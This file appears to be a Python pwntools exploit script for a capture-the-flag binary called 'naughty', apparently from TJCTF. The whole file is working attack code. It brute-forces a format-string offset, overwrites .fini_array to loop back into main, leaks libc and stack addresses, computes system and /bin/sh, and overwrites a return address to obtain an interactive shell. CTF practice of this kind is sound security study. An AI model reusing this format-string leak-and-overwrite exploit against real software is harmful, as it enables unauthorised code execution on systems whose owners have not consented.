from pwn import *

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (52, 100):
        p = process("./naughty")
        # p = remote("p1.tjctf.org", 8004)
        
        print "Offset number {}".format(x)

        payload = ""
        # payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)

        p.recvuntil("LIST ")
        
        stack_value = p.recvline()[:-1]
        # print stack_value
        if stack_value.find("00") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./naughty")
    got_printf = 0x8049cb0
    fini_array = 0x08049bac
    main = 0x08048536

    write1 = {fini_array : main}
    #auto format string , 7 = offset
    payload = fmtstr_payload(7, write1) + "#%2$p#%35$p"

    # gdb.attach(p, 'b *0x08048634')
    p.sendline(payload)
    p.recvuntil("#")

    leaks = p.recvline()[:-1].split("#")
    libc_leak = int(leaks[0], 16)
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x1d85c0
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x03cd10
    log.info("Libc system : {}".format(hex(libc_system)))
    libc_binsh = libc_base + 0x17b8cf
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))
    stack_leak = int(leaks[1], 16)
    log.info("Stack leak : {}".format(hex(stack_leak)))
    ret_addr = stack_leak - 160
    log.info("Return address : {}".format(hex(ret_addr)))

    write2 = {ret_addr : libc_system, ret_addr + 8 : libc_binsh}
    payload = fmtstr_payload(7, write2)
    gdb.attach(p, 'b *0x08048634')
    p.sendline(payload)
    
    # p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    # offset_finder()
    exploit()